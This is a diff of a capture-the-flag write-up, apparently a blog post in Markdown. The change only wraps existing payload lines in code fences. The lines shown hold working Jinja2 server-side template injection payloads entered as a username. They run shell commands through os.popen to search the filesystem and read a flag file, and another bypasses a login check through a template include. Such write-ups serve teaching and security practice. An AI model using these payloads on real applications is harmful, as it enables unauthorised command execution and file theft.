@@ -98,7 +98,9 @@ to list the content of the current direcory.
 
 Then I've used
 {% raw %}
+```
 {{config.__class__.__init__.__globals__['os'].popen('find / -name \\*flag\\* > find.txt && cat find.txt').read()}}
+```
 {% endraw %}
 
 as input for the username to search for all files that contain *flag* in it's name and afterwards cat the results out.
@@ -112,7 +114,9 @@ And got this as results
 So finally the last step was to use
 
 {% raw %}
+```
 {{config.__class__.__init__.__globals__['os'].popen('cat /app/templates/flag.html').read()}}
+```
 {% endraw %}
 
 
@@ -132,9 +136,10 @@ _Damn, that was smart._
 I tried this method on my own and entered 
 
 {% raw %}
+```
 {% set logged_in = true %}{% include 'flag.html' %}
+```
 {% endraw %}
-
 
 And voilà we get the flag without using a lot of SSTI kung-fu.  
 
